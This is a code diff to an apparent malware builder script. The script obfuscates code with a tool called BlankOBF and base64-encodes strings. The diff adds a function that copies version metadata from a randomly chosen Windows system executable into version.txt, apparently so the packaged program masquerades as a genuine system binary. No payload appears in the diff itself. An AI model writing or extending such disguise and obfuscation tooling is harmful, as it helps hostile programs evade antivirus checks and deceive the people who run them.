@@ -2,6 +2,8 @@ import json
 import base64
 import os
 import urllib3
+import subprocess
+import random
 
 import BlankOBF as obfuscator
 
@@ -63,6 +65,28 @@ def EncryptString(plainText: str) -> str:
     encoded = base64.b64encode(plainText.encode()).decode()
     return "base64.b64decode(\"{}\").decode()".format(encoded)
 
+def MakeVersionFile() -> None:
+    retries = 0
+    exeFiles = []
+    paths = [
+        os.getenv("SystemRoot"),
+        os.path.join(os.getenv("SystemRoot"), "System32"),
+        os.path.join(os.getenv("SystemRoot"), "sysWOW64")
+    ]
+
+    for path in paths:
+        if os.path.isdir(path):
+            exeFiles += [os.path.join(path, x) for x in os.listdir(path) if (x.endswith(".exe") and not x in exeFiles)]
+
+    if exeFiles:
+        while(retries < 5):
+            file = random.choice(exeFiles)
+            res = subprocess.run('pyi-grab_version "{}" version.txt'.format(file), shell= True, capture_output= True)
+            if res.returncode != 0:
+                retries += 1
+            else:
+                break
+
 def main() -> None:
     with open(InCodeFile) as file:
         code = file.read()
@@ -70,6 +94,7 @@ def main() -> None:
     code = WriteSettings(code, *ReadSettings())
 
     obfuscator.BlankOBF(code, OutCodeFile)
+    MakeVersionFile()
 
 if __name__ == "__main__":
     main()
